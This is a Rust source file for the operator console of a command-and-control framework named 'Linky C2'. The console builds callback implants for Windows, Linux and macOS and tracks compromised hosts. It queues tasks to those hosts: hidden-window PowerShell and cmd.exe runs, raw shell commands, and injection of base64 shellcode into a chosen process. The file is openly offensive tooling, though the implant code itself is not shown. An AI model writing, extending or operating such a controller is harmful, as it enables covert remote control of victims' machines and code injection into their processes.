use rustyline::{error::ReadlineError, DefaultEditor};
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::generate;
use crate::links::{LinkStatus, Links};

pub fn run(links: Arc<Mutex<Links>>) {
    println!("Linky C2 – type 'help' for commands\n");

    let mut rl = DefaultEditor::new().expect("readline init failed");

    loop {
        match rl.readline("linky> ") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(&line);

                let (cmd, rest) = split_first(&line);
                match cmd {
                    "links" => links_menu(&links, &mut rl),
                    "generate" => {
                        if rest.is_empty() {
                            println!("Usage: generate <ip:port>");
                        } else {
                            generate::generate_windows(rest);
                        }
                    }
                    "generate-linux" => {
                        if rest.is_empty() {
                            println!("Usage: generate-linux <ip:port>");
                        } else {
                            generate::generate_linux(rest);
                        }
                    }
                    "generate-osx" => {
                        if rest.is_empty() {
                            println!("Usage: generate-osx <ip:port>");
                        } else {
                            generate::generate_osx(rest);
                        }
                    }
                    "help" => print_help(),
                    "exit" | "quit" | "kill" => {
                        println!("Exiting.");
                        std::process::exit(0);
                    }
                    _ => println!("Unknown command '{}'. Type 'help'.", cmd),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => {
                println!("\nExiting.");
                std::process::exit(0);
            }
            Err(e) => eprintln!("readline error: {}", e),
        }
    }
}

// ── Links submenu ────────────────────────────────────────────────────────────

fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
    print_links_table(links);

    loop {
        match rl.readline("links> ") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(&line);
                let (cmd, rest) = split_first(&line);

                match cmd {
                    "-h" | "help" => {
                        println!("  -a          Show all links (including inactive)");
                        println!("  -i <name>   Interact with a link");
                        println!("  -k <name>   Send kill task + mark exited");
                        println!("  back        Return to main menu");
                    }
                    "-a" => print_links_table(links),
                    "-i" => {
                        if rest.is_empty() {
                            println!("Usage: -i <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            interact(links, id, rl);
                        } else {
                            println!("[-] Link not found: {}", rest);
                        }
                    }
                    "-k" => {
                        if rest.is_empty() {
                            println!("Usage: -k <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            let mut l = links.lock().unwrap();
                            l.add_task(id, "exit".into(), "kill".into());
                            l.kill_link(id);
                            println!("[+] Kill task queued.");
                        } else {
                            println!("[-] Link not found: {}", rest);
                        }
                    }
                    "back" | "exit" | "q" => break,
                    _ => println!("Unknown. Type -h for help."),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => eprintln!("readline: {}", e),
        }
    }
}

fn print_links_table(links: &Arc<Mutex<Links>>) {
    let links = links.lock().unwrap();
    let all = links.all_links();
    if all.is_empty() {
        println!("No links registered.");
        return;
    }
    println!(
        "\n{:<12} {:<24} {:<18} {:<12} {:<10}",
        "Name", "User@Host", "IP", "Platform", "Status"
    );
    println!("{}", "─".repeat(78));
    for l in all {
        let status = match l.status {
            LinkStatus::Active => "Active",
            LinkStatus::Inactive => "Inactive",
            LinkStatus::Exited => "Exited",
        };
        println!(
            "{:<12} {:<24} {:<18} {:<12} {:<10}",
            l.name,
            format!("{}@{}", l.username, l.hostname),
            l.internal_ip,
            l.platform,
            status,
        );
    }
    println!();
}

// ── Per-link interaction ─────────────────────────────────────────────────────

fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
    {
        let l = links.lock().unwrap();
        if let Some(link) = l.get_link(link_id) {
            println!(
                "\n[*] Interacting with {} – {}@{} [{}]",
                link.name, link.username, link.hostname, link.platform
            );
            println!("    Type 'help' for commands, 'back' to return\n");
        }
    }

    loop {
        let prompt = {
            let l = links.lock().unwrap();
            l.get_link(link_id)
                .map(|lk| format!("{}> ", lk.name))
                .unwrap_or_else(|| "link> ".into())
        };

        match rl.readline(&prompt) {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(&line);
                let (cmd, args) = split_first(&line);

                match cmd {
                    "help" => print_link_help(),
                    "back" | "exit" => break,
                    "info" => show_info(links, link_id),
                    "kill" => {
                        let mut l = links.lock().unwrap();
                        l.add_task(link_id, "exit".into(), "kill".into());
                        l.kill_link(link_id);
                        println!("[+] Kill task queued.");
                        break;
                    }

                    // ── Shell execution helpers ──────────────────────────
                    "cmd" => queue(links, link_id, format!("cmd /C {}", args), line.clone()),
                    "shell" => queue(links, link_id, line.clone(), line.clone()),
                    "powershell" | "ps" => queue(
                        links,
                        link_id,
                        format!("powershell -noP -sta -w 1 -c \"{}\"", args),
                        line.clone(),
                    ),

                    // ── Built-in navigation ─────────────────────────────
                    "cd" | "pwd" | "ls" | "whoami" | "pid" | "integrity" => {
                        queue(links, link_id, line.clone(), line.clone())
                    }

                    // ── Process injection ───────────────────────────────
                    "inject" => queue(links, link_id, line.clone(), line.clone()),

                    // ── Catch-all: send raw ─────────────────────────────
                    _ => queue(links, link_id, line.clone(), line.clone()),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => eprintln!("readline: {}", e),
        }
    }
}

fn show_info(links: &Arc<Mutex<Links>>, link_id: Uuid) {
    let l = links.lock().unwrap();
    if let Some(link) = l.get_link(link_id) {
        println!("  Name      : {}", link.name);
        println!("  ID        : {}", link.id);
        println!("  User      : {}@{}", link.username, link.hostname);
        println!("  Internal  : {}", link.internal_ip);
        println!("  Platform  : {}", link.platform);
        println!("  PID       : {}", link.pid);
        println!(
            "  First seen: {}",
            link.first_checkin.format("%Y-%m-%d %H:%M:%S")
        );
        println!(
            "  Last seen : {}",
            link.last_checkin.format("%Y-%m-%d %H:%M:%S")
        );
        let status = match link.status {
            LinkStatus::Active => "Active",
            LinkStatus::Inactive => "Inactive",
            LinkStatus::Exited => "Exited",
        };
        println!("  Status    : {}", status);
    }
}

fn queue(links: &Arc<Mutex<Links>>, link_id: Uuid, command: String, cli_cmd: String) {
    let mut l = links.lock().unwrap();
    l.add_task(link_id, command, cli_cmd);
}

fn resolve_link(links: &Arc<Mutex<Links>>, name: &str) -> Option<Uuid> {
    links.lock().unwrap().get_link_by_name(name).map(|l| l.id)
}

// ── Helpers ──────────────────────────────────────────────────────────────────

/// Split "cmd rest…" → ("cmd", "rest…").
fn split_first(s: &str) -> (&str, &str) {
    match s.find(' ') {
        Some(i) => (&s[..i], s[i + 1..].trim_start()),
        None => (s, ""),
    }
}

fn print_help() {
    println!("  links                    Manage active links");
    println!("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
    println!("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
    println!("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
    println!("  help                     Show this help");
    println!("  exit / kill              Quit linky");
}

fn print_link_help() {
    println!("  cmd <args>          Execute via cmd.exe /C <args>");
    println!("  shell <cmd>         Send raw command string");
    println!("  powershell <args>   Execute via powershell.exe");
    println!("  ls [path]           List directory");
    println!("  cd <path>           Change directory");
    println!("  pwd                 Print working directory");
    println!("  whoami              Current user (domain\\user)");
    println!("  pid                 Process ID");
    println!("  integrity           Token integrity level");
    println!("  inject <pid> <b64>  Inject base64 shellcode into PID");
    println!("  info                Show link metadata");
    println!("  kill                Send exit + mark link dead");
    println!("  back                Return to links menu");
}
